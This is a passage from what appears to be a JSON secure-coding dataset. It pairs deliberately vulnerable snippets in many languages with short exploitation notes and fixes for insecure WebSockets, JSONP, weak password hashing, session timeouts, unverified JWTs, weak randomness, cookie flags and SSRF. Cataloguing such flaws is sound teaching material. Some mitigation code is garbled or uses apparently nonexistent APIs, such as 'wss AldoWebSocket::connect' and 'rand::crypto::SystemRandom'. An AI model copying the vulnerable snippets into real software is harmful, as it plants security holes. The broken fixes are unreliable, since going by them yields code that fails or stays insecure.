  "mitigation": "Use wss://example.com for secure connection."
}
{
  "id": "vuln-363",
  "language": "Go",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using ws:// WebSocket.",
  "code_snippet": "ws, _ := websocket.Dial(\"ws://example.com\", \"\", \"http://localhost\")",
  "exploitation_techniques": "MITM to intercept data.",
  "mitigation": "Use wss:// for encrypted WebSocket."
}
{
  "id": "vuln-364",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connection.",
  "code_snippet": "var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(\"ws://example.com\"), CancellationToken.None);",
  "exploitation_techniques": "Capture unencrypted WebSocket traffic.",
  "mitigation": "Use wss://example.com for secure connection."
}
{
  "id": "vuln-365",
  "language": "Kotlin",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using ws:// instead of wss://.",
  "code_snippet": "val ws = WebSocket(\"ws://example.com\")",
  "exploitation_techniques": "MITM to intercept traffic.",
  "mitigation": "Use wss://example.com for secure WebSocket."
}
{
  "id": "vuln-366",
  "language": "Scala",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connection.",
  "code_snippet": "val ws = WebSocket(\"ws://example.com\")",
  "exploitation_techniques": "Sniff unencrypted WebSocket data.",
  "mitigation": "Use wss:// for secure connection."
}
{
  "id": "vuln-367",
  "language": "Rust",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using ws:// WebSocket.",
  "code_snippet": "let ws = tungstenite::connect(Url::parse(\"ws://example.com\")?).1;",
  "exploitation_techniques": "MITM to capture traffic.",
  "mitigation": "Use wss AldoWebSocket::connect(Url::parse(\"wss://example.com\")?).1"
}
{
  "id": "vuln-368",
  "language": "Elixir",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connections.",
  "code_snippet": "web_socket = WebSocket.connect(\"ws://example.com\")",
  "exploitation_techniques": "Intercept unencrypted WebSocket traffic.",
  "mitigation": "Use wss://example.com for secure connections."
}
{
  "id": "vuln-369",
  "language": "Perl",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using unencrypted ws://.",
  "code_snippet": "my $ws = Net::WebSocket::Client->new('ws://example.com');",
  "exploitation_techniques": "Sniff WebSocket traffic.",
  "mitigation": "Use wss:// for encrypted WebSocket."
}
{
  "id": "vuln-370",
  "language": "Node.js",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP callback without validation.",
  "code_snippet": "res.jsonp({ data: sensitiveData }, req.query.callback);",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate callback names; avoid JSONP if possible."
}
{
  "id": "vuln-371",
  "language": "Python",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Whitelist callbacks or use CORS instead."
}
{
  "id": "vuln-372",
  "language": "Java",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP with unvalidated callback.",
  "code_snippet": "String callback = request.getParameter(\"callback\"); response.getWriter().write(callback + \"(\" + data + \")\");",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate callback; prefer CORS."
}
{
  "id": "vuln-373",
  "language": "PHP",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "$callback = $_GET['callback']; echo \"$callback($data);\";",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Validate: if (preg_match('/^[a-zA-Z0-9_]+$/', $callback)) echo \"$callback($data);\";"
}
{
  "id": "vuln-374",
  "language": "Ruby",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP callback without validation.",
  "code_snippet": "render json: data, callback: params[:callback]",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate callback names; use CORS."
}
{
  "id": "vuln-375",
  "language": "Go",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "callback := r.URL.Query().Get(\"callback\"); fmt.Fprintf(w, \"%s(%s)\", callback, data)",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Validate callback with regex; prefer CORS."
}
{
  "id": "vuln-376",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP with unvalidated callback.",
  "code_snippet": "var callback = Request.Query[\"callback\"]; return Content($\"{callback}({data})\");",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate: if (Regex.IsMatch(callback, \"^[a-zA-Z0-9_]+$\")) return Content(...);"
}
{
  "id": "vuln-377",
  "language": "Kotlin",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "val callback = call.request.queryParameters[\"callback\"]; call.respondText(\"$callback($data)\")",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Validate: if (callback?.matches(Regex(\"^[a-zA-Z0-9_]+$\")) == true) respond"
}
{
  "id": "vuln-378",
  "language": "Scala",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP callback without validation.",
  "code_snippet": "val callback = params(\"callback\"); Ok(s\"$callback($data)\")",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate: if (callback.matches(\"^[a-zA-Z0-9_]+$\")) Ok(...)"
}
{
  "id": "vuln-379",
  "language": "Rust",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "let callback = req.query(\"callback\")?; res.render_text(format!(\"{}({})\", callback, data))",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Validate: if callback.chars().all(|c| c.is_alphanumeric() || c == '_') { render }"
}
{
  "id": "vuln-380",
  "language": "Elixir",
  "vulnerability_type": "Insecure JSONP",
  "description": "JSONP with unvalidated callback.",
  "code_snippet": "callback = params[\"callback\"]; send_resp(conn, 200, \"#{callback}(#{data})\")",
  "exploitation_techniques": "Inject malicious callback to steal data.",
  "mitigation": "Validate: if String.match?(callback, ~r/^[a-zA-Z0-9_]+$/) do send_resp"
}
{
  "id": "vuln-381",
  "language": "Perl",
  "vulnerability_type": "Insecure JSONP",
  "description": "Unvalidated JSONP callback.",
  "code_snippet": "my $callback = $r->param('callback'); print \"$callback($data);\";",
  "exploitation_techniques": "Inject malicious callback function.",
  "mitigation": "Validate: print \"$callback($data);\" if $callback =~ /^[a-zA-Z0-9_]+$/;"
}
{
  "id": "vuln-382",
  "language": "Node.js",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using weak or unsalted hash for passwords.",
  "code_snippet": "const hash = crypto.createHash('md5').update(password).digest('hex');",
  "exploitation_techniques": "Crack hashes with rainbow tables.",
  "mitigation": "Use bcrypt: bcrypt.hashSync(password, 10)"
}
{
  "id": "vuln-383",
  "language": "Python",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using MD5 or SHA1 for passwords.",
  "code_snippet": "hash = hashlib.md5(password.encode()).hexdigest()",
  "exploitation_techniques": "Use rainbow tables to reverse hashes.",
  "mitigation": "Use bcrypt: bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
}
{
  "id": "vuln-384",
  "language": "Java",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using weak hashing algorithm for passwords.",
  "code_snippet": "MessageDigest md = MessageDigest.getInstance(\"SHA1\"); String hash = md.digest(password.getBytes());",
  "exploitation_techniques": "Crack with precomputed tables.",
  "mitigation": "Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())"
}
{
  "id": "vuln-385",
  "language": "PHP",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using MD5 for password storage.",
  "code_snippet": "$hash = md5($password);",
  "exploitation_techniques": "Reverse hashes with rainbow tables.",
  "mitigation": "Use password_hash($password, PASSWORD_BCRYPT)"
}
{
  "id": "vuln-386",
  "language": "Ruby",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using unsalted SHA1 for passwords.",
  "code_snippet": "hash = Digest::SHA1.hexdigest(password)",
  "exploitation_techniques": "Crack with precomputed tables.",
  "mitigation": "Use BCrypt: BCrypt::Password.create(password)"
}
{
  "id": "vuln-387",
  "language": "Go",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using weak hash for passwords.",
  "code_snippet": "hash := sha1.Sum([]byte(password))",
  "exploitation_techniques": "Use rainbow tables to crack hashes.",
  "mitigation": "Use bcrypt: bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)"
}
{
  "id": "vuln-388",
  "language": "C# (.NET)",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using MD5 for password storage.",
  "code_snippet": "var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));",
  "exploitation_techniques": "Crack with rainbow tables.",
  "mitigation": "Use BCrypt: BCrypt.Net.BCrypt.HashPassword(password, 12)"
}
{
  "id": "vuln-389",
  "language": "Kotlin",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using SHA1 for passwords.",
  "code_snippet": "val hash = MessageDigest.getInstance(\"SHA1\").digest(password.toByteArray())",
  "exploitation_techniques": "Reverse hashes with tables.",
  "mitigation": "Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())"
}
{
  "id": "vuln-390",
  "language": "Scala",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using weak hash algorithm.",
  "code_snippet": "val hash = MessageDigest.getInstance(\"MD5\").digest(password.getBytes)",
  "exploitation_techniques": "Crack with precomputed tables.",
  "mitigation": "Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())"
}
{
  "id": "vuln-391",
  "language": "Rust",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using SHA1 for password hashing.",
  "code_snippet": "let hash = sha1::Sha1::from(password).digest().bytes();",
  "exploitation_techniques": "Use rainbow tables to crack.",
  "mitigation": "Use bcrypt::hash(password, DEFAULT_COST)"
}
{
  "id": "vuln-392",
  "language": "Elixir",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using weak hash for passwords.",
  "code_snippet": "hash = :crypto.hash(:md5, password)",
  "exploitation_techniques": "Crack with rainbow tables.",
  "mitigation": "Use Bcrypt.hash_pwd_salt(password)"
}
{
  "id": "vuln-393",
  "language": "Perl",
  "vulnerability_type": "Weak Password Hashing",
  "description": "Using MD5 for password storage.",
  "code_snippet": "use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);",
  "exploitation_techniques": "Reverse with rainbow tables.",
  "mitigation": "Use Crypt::Bcrypt: bcrypt_hash($password, '$2a$12$salt')"
}
{
  "id": "vuln-394",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration or long timeout.",
  "code_snippet": "app.use(session({ secret: 'secret', cookie: { maxAge: null } }));",
  "exploitation_techniques": "Steal session cookies for persistent access.",
  "mitigation": "Set short timeout: cookie: { maxAge: 3600000 } // 1 hour"
}
{
  "id": "vuln-395",
  "language": "Python",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration.",
  "code_snippet": "app.config['SESSION_COOKIE_LIFETIME'] = None",
  "exploitation_techniques": "Reuse stolen cookies indefinitely.",
  "mitigation": "Set: app.config['SESSION_COOKIE_LIFETIME'] = timedelta(hours=1)"
}
{
  "id": "vuln-396",
  "language": "Java",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Long or no session timeout.",
  "code_snippet": "session.setMaxInactiveInterval(0);",
  "exploitation_techniques": "Persistent session hijacking.",
  "mitigation": "Set: session.setMaxInactiveInterval(3600); // 1 hour"
}
{
  "id": "vuln-397",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration time.",
  "code_snippet": "session_set_cookie_params(0);",
  "exploitation_techniques": "Steal cookies for indefinite access.",
  "mitigation": "Set: session_set_cookie_params(3600); // 1 hour"
}
{
  "id": "vuln-398",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without timeout.",
  "code_snippet": "config.session_store :cookie_store, expire_after: nil",
  "exploitation_techniques": "Persistent session cookie attacks.",
  "mitigation": "Set: expire_after: 1.hour"
}
{
  "id": "vuln-399",
  "language": "Go",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session cookie expiration.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: id, Expires: time.Time{}})",
  "exploitation_techniques": "Reuse cookies indefinitely.",
  "mitigation": "Set: Expires: time.Now().Add(1 * time.Hour)"
}
{
  "id": "vuln-400",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration.",
  "code_snippet": "services.AddSession(options => { options.IdleTimeout = TimeSpan.Zero; });",
  "exploitation_techniques": "Persistent session hijacking.",
  "mitigation": "Set: options.IdleTimeout = TimeSpan.FromHours(1);"
}
{
  "id": "vuln-401",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration configured.",
  "code_snippet": "sessionConfig { cookie.maxAgeInSeconds = 0 }",
  "exploitation_techniques": "Steal session cookies for persistent access.",
  "mitigation": "Set timeout: cookie.maxAgeInSeconds = 3600 // 1 hour"
}
{
  "id": "vuln-402",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "sessionConfig.withMaxAge(None)",
  "exploitation_techniques": "Reuse stolen cookies indefinitely.",
  "mitigation": "Set: sessionConfig.withMaxAge(Some(3600.seconds))"
}
{
  "id": "vuln-403",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No expiration for session cookies.",
  "code_snippet": "cookie.set_expires(None);",
  "exploitation_techniques": "Persistent session hijacking.",
  "mitigation": "Set: cookie.set_expires(OffsetDateTime::now_utc() + Duration::hours(1))"
}
{
  "id": "vuln-404",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration time.",
  "code_snippet": "plug :fetch_session; put_session(conn, :user_id, id)",
  "exploitation_techniques": "Steal cookies for indefinite access.",
  "mitigation": "Set: put_session(conn, :user_id, id, max_age: 3600)"
}
{
  "id": "vuln-405",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session cookie expiration.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$id\");",
  "exploitation_techniques": "Persistent session attacks.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$id; Max-Age=3600\")"
}
{
  "id": "vuln-406",
  "language": "Node.js",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Accepting unverified JWT tokens.",
  "code_snippet": "const payload = jwt.decode(token);",
  "exploitation_techniques": "Forge tokens without signature verification.",
  "mitigation": "Use: jwt.verify(token, secret, { algorithms: ['HS256'] })"
}
{
  "id": "vuln-407",
  "language": "Python",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "payload = jwt.decode(token, options={'verify_signature': False})",
  "exploitation_techniques": "Craft malicious JWTs to bypass auth.",
  "mitigation": "Verify: jwt.decode(token, key=secret, algorithms=['HS256'])"
}
{
  "id": "vuln-408",
  "language": "Java",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without verification.",
  "code_snippet": "JWT jwt = JWTParser.parse(token);",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Use: Jwts.parser().setSigningKey(key).parseClaimsJws(token)"
}
{
  "id": "vuln-409",
  "language": "PHP",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature validation.",
  "code_snippet": "$payload = JWT::decode($token, null, false);",
  "exploitation_techniques": "Forge tokens to impersonate users.",
  "mitigation": "Verify: JWT::decode($token, $key, ['HS256'])"
}
{
  "id": "vuln-410",
  "language": "Ruby",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWT without verification.",
  "code_snippet": "payload = JWT.decode(token, nil, false)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: JWT.decode(token, secret, true, algorithm: 'HS256')"
}
{
  "id": "vuln-411",
  "language": "Go",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without validation.",
  "code_snippet": "token, _ := jwt.Parse(tokenString, nil)",
  "exploitation_techniques": "Forge tokens to bypass auth.",
  "mitigation": "Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return key, nil })"
}
{
  "id": "vuln-412",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "var payload = JwtSecurityTokenHandler().ReadJwtToken(token);",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Validate: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)"
}
{
  "id": "vuln-413",
  "language": "Kotlin",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without verification.",
  "code_snippet": "val jwt = JWT.decode(token)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token)"
}
{
  "id": "vuln-414",
  "language": "Scala",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature validation.",
  "code_snippet": "val payload = JWT.decode(token)",
  "exploitation_techniques": "Forge tokens to impersonate users.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token)"
}
{
  "id": "vuln-415",
  "language": "Rust",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWT without validation.",
  "code_snippet": "let claims = jsonwebtoken::decode_header(&token)?;",
  "exploitation_techniques": "Inject forged JWTs.",
  "mitigation": "Verify: jsonwebtoken::decode(&token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))"
}
{
  "id": "vuln-416",
  "language": "Elixir",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "No JWT signature verification.",
  "code_snippet": "{:ok, payload, _} = Joken.peek(token)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: Joken.verify_and_validate(config, token)"
}
{
  "id": "vuln-417",
  "language": "Perl",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWT without verification.",
  "code_snippet": "my $payload = decode_jwt($token, undef, 0);",
  "exploitation_techniques": "Forge tokens to bypass auth.",
  "mitigation": "Verify: decode_jwt($token, $secret, 1)"
}
{
  "id": "vuln-418",
  "language": "Node.js",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Math.random for security-sensitive operations.",
  "code_snippet": "const token = Math.random().toString(36).substring(2);",
  "exploitation_techniques": "Predict random values for token guessing.",
  "mitigation": "Use crypto.randomBytes(16).toString('hex')"
}
{
  "id": "vuln-419",
  "language": "Python",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using random module for cryptographic purposes.",
  "code_snippet": "import random; token = ''.join(random.choices('abcdef0123456789', k=16))",
  "exploitation_techniques": "Predict tokens due to weak PRNG.",
  "mitigation": "Use secrets.token_hex(16)"
}
{
  "id": "vuln-420",
  "language": "Java",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random instead of SecureRandom.",
  "code_snippet": "Random rand = new Random(); String token = String.valueOf(rand.nextLong());",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use SecureRandom: new SecureRandom().nextBytes(bytes)"
}
{
  "id": "vuln-421",
  "language": "PHP",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand() for security tokens.",
  "code_snippet": "$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",
  "exploitation_techniques": "Predict tokens due to weak randomness.",
  "mitigation": "Use random_bytes(16) and bin2hex"
}
{
  "id": "vuln-422",
  "language": "Ruby",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand for cryptographic tokens.",
  "code_snippet": "token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join",
  "exploitation_techniques": "Predict random tokens.",
  "mitigation": "Use SecureRandom.hex(16)"
}
{
  "id": "vuln-423",
  "language": "Go",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using math/rand for security purposes.",
  "code_snippet": "rand.Seed(time.Now().UnixNano()); token := rand.Int63()",
  "exploitation_techniques": "Predict values based on seed.",
  "mitigation": "Use crypto/rand: crypto.Read(bytes)"
}
{
  "id": "vuln-424",
  "language": "C# (.NET)",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random for cryptographic tokens.",
  "code_snippet": "var rand = new Random(); var token = rand.Next().ToString();",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use RNGCryptoServiceProvider: GetBytes(bytes)"
}
{
  "id": "vuln-425",
  "language": "Kotlin",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using Random for security tokens.",
  "code_snippet": "val token = Random().nextLong().toString()",
  "exploitation_techniques": "Predict tokens due to weak PRNG.",
  "mitigation": "Use SecureRandom: SecureRandom().nextBytes(bytes)"
}
{
  "id": "vuln-426",
  "language": "Scala",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using scala.util.Random for crypto.",
  "code_snippet": "val token = scala.util.Random.nextString(16)",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use SecureRandom: java.security.SecureRandom"
}
{
  "id": "vuln-427",
  "language": "Rust",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand::thread_rng for crypto.",
  "code_snippet": "let token = thread_rng().gen::<u64>().to_string();",
  "exploitation_techniques": "Predict values from weak PRNG.",
  "mitigation": "Use rand::crypto::SystemRandom"
}
{
  "id": "vuln-428",
  "language": "Elixir",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using :rand for cryptographic tokens.",
  "code_snippet": "token = :rand.uniform(1_000_000_000) |> Integer.to_string()",
  "exploitation_techniques": "Predict random tokens.",
  "mitigation": "Use :crypto.strong_rand_bytes(16) |> Base.encode16()"
}
{
  "id": "vuln-429",
  "language": "Perl",
  "vulnerability_type": "Weak Random Number Generation",
  "description": "Using rand for security tokens.",
  "code_snippet": "my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use Crypt::Random::Source for secure randomness."
}
{
  "id": "vuln-430",
  "language": "Node.js",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing Secure and HttpOnly flags.",
  "code_snippet": "res.cookie('session', token);",
  "exploitation_techniques": "Steal cookies via XSS or MITM.",
  "mitigation": "Set: res.cookie('session', token, { secure: true, httpOnly: true })"
}
{
  "id": "vuln-431",
  "language": "Python",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "response.set_cookie('session', token)",
  "exploitation_techniques": "Access cookies via XSS or insecure HTTP.",
  "mitigation": "Set: response.set_cookie('session', token, secure=True, httponly=True)"
}
{
  "id": "vuln-432",
  "language": "Java",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Cookie cookie = new Cookie(\"session\", token); response.addCookie(cookie);",
  "exploitation_techniques": "Steal cookies via XSS or MITM.",
  "mitigation": "Set: cookie.setSecure(true); cookie.setHttpOnly(true);"
}
{
  "id": "vuln-433",
  "language": "PHP",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "setcookie('session', $token);",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: setcookie('session', $token, ['secure' => true, 'httponly' => true]);"
}
{
  "id": "vuln-434",
  "language": "Ruby",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "cookies[:session] = token",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: cookies[:session] = { value: token, secure: true, httponly: true }"
}
{
  "id": "vuln-435",
  "language": "Go",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token})",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: &http.Cookie{Name: \"session\", Value: token, Secure: true, HttpOnly: true}"
}
{
  "id": "vuln-436",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Response.Cookies.Append(\"session\", token);",
  "exploitation_techniques": "Steal via XSS or insecure HTTP.",
  "mitigation": "Set: Response.Cookies.Append(\"session\", token, new CookieOptions { Secure = true, HttpOnly = true });"
}
{
  "id": "vuln-437",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "call.response.cookies.append(\"session\", token)",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: call.response.cookies.append(Cookie(\"session\", token, secure = true, httpOnly = true))"
}
{
  "id": "vuln-438",
  "language": "Scala",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "Ok.withCookies(Cookie(\"session\", token))",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: Cookie(\"session\", token, secure = true, httpOnly = true)"
}
{
  "id": "vuln-439",
  "language": "Rust",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "res.cookie(Cookie::new(\"session\", token))",
  "exploitation_techniques": "Access cookies via XSS or MITM.",
  "mitigation": "Set: Cookie::new_with_attributes(\"session\", token, { secure: true, http_only: true })"
}
{
  "id": "vuln-440",
  "language": "Elixir",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies missing security flags.",
  "code_snippet": "put_resp_cookie(conn, \"session\", token)",
  "exploitation_techniques": "Steal cookies via XSS or HTTP.",
  "mitigation": "Set: put_resp_cookie(conn, \"session\", token, secure: true, http_only: true)"
}
{
  "id": "vuln-441",
  "language": "Perl",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token\");",
  "exploitation_techniques": "Steal via XSS or insecure HTTP.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$token; Secure; HttpOnly\")"
}
{
  "id": "vuln-442",
  "language": "Node.js",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URLs in server requests.",
  "code_snippet": "axios.get(req.query.url);",
  "exploitation_techniques": "Access internal services: http://localhost:8080/admin",
  "mitigation": "Whitelist URLs: if (url.match(/^https:\/\/allowed\.com/)) axios.get(url)"
}
{
  "id": "vuln-443",
  "language": "Python",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "response = requests.get(request.args.get('url'))",
  "exploitation_techniques": "Request internal endpoints like http://127.0.0.1.",
  "mitigation": "Validate: if urlparse(url).hostname in ALLOWED_HOSTS: requests.get(url)"
}
{
  "id": "vuln-444",
  "language": "Java",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "URL url = new URL(request.getParameter(\"url\")); url.openConnection().getInputStream();",
  "exploitation_techniques": "Access internal APIs or localhost.",
  "mitigation": "Whitelist: if (ALLOWED_HOSTS.contains(url.getHost())) url.openConnection()"
}
{
  "id": "vuln-445",
  "language": "PHP",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "file_get_contents($_GET['url']);",
  "exploitation_techniques": "Request internal resources: http://localhost.",
  "mitigation": "Validate: if (in_array(parse_url($url, PHP_URL_HOST), $allowed)) file_get_contents($url)"
}
{
  "id": "vuln-446",
  "language": "Ruby",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL requests.",
  "code_snippet": "response = Net::HTTP.get(URI(params[:url]))",
  "exploitation_techniques": "Access internal endpoints.",
  "mitigation": "Validate: Net::HTTP.get(URI(url)) if ALLOWED_HOSTS.include?(URI(url).host)"
}
{
  "id": "vuln-447",
  "language": "Go",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"))",
  "exploitation_techniques": "Request internal services like http://127.0.0.1.",
  "mitigation": "Validate: if strings.HasPrefix(url, \"https://allowed.com\") { http.Get(url) }"
}
{
  "id": "vuln-448",
  "language": "C# (.NET)",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "var response = await new HttpClient().GetAsync(Request.Query[\"url\"]);",
  "exploitation_techniques": "Access internal APIs.",
  "mitigation": "Validate: if (ALLOWED_HOSTS.Contains(new Uri(url).Host)) await client.GetAsync(url)"
}
{
  "id": "vuln-449",
  "language": "Kotlin",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "val response = URL(call.request.queryParameters[\"url\"]).readText()",
  "exploitation_techniques": "Request internal endpoints.",
  "mitigation": "Validate: if (url.host in ALLOWED_HOSTS) URL(url).readText()"
}
{
  "id": "vuln-450",
  "language": "Scala",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL requests.",
  "code_snippet": "val response = scala.io.Source.fromURL(params(\"url\")).mkString",
  "exploitation_techniques": "Access internal services.",
  "mitigation": "Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost)) Source.fromURL(url)"
}
{
  "id": "vuln-451",
  "language": "Rust",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
